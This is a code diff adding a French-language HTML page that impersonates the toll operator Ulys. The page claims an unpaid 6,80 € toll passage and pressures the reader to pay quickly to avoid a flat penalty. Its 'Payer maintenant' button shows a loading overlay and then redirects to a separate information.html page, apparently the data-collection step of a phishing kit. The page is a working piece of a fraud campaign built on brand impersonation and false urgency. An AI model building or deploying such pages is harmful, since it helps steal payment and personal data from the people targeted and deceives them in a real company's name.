@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Régularisation de paiement – Ulys</title>
+  <link rel="stylesheet" href="assets/css/style.css"/>
+</head>
+<body>
+
+  <!-- CONTENU CONTEXTE -->
+  <main class="context-container">
+    <p class="context-header">Merci de régler votre passage&nbsp;!</p>
+
+    <div class="card context-card">
+      <!-- Logo Ulys centré -->
+      <img src="assets/images/ulys-logo.png" alt="Ulys" class="context-logo"/>
+
+      <!-- Titre et message -->
+      <h2 class="context-title">Paiement refusé – 6,80 € à régler</h2>
+      <p>Bonjour,</p>
+      <p>Nous avons constaté que votre dernier passage au péage n’a pas été réglé. Le montant dû est de 6,80 €.</p>
+      <p>Il est important de régulariser cette situation dans les plus brefs délais afin d’éviter la facturation de la somme forfaitaire.</p>
+      <p>Ce solde peut être réglé facilement en ligne en cliquant sur le bouton ci-dessous. Une fois le paiement effectué, aucune autre démarche ne sera nécessaire.</p>
+
+      <!-- Bouton Payer maintenant -->
+      <button id="btn-pay" class="btn btn-danger">Payer maintenant</button>
+    </div>
+  </main>
+
+  <!-- SCRIPT DE MINI-CHARGEMENT -->
+  <script>
+    document.getElementById('btn-pay').addEventListener('click', function(){
+      // Overlay de chargement
+      const overlay = document.createElement('div');
+      overlay.className = 'loader-overlay';
+      overlay.innerHTML = '<div class="loader"></div>';
+      document.body.appendChild(overlay);
+
+      // Après 1.5s on redirige vers information.html
+      setTimeout(()=> window.location.href = 'information.html', 1500);
+    });
+  </script>
+</body>
+</html>
